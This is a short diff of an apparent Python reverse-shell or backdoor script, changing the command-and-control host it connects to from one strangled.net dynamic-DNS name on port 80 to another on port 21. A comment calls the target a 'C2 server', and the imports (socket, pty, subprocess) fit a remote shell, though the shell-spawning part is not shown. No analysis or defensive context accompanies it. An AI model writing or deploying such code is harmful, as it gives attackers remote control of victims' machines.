@@ -3,7 +3,7 @@ import socket, os, pty, select, subprocess
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Ensure this points to your verified proxy VM or C2 server port
-    s.connect(("cheeva.strangled.net", 80))
+    s.connect(("linux-x86-tcpudp.strangled.net", 21))
     
     try: local_ip = s.getsockname()
     except: local_ip = "Legacy"
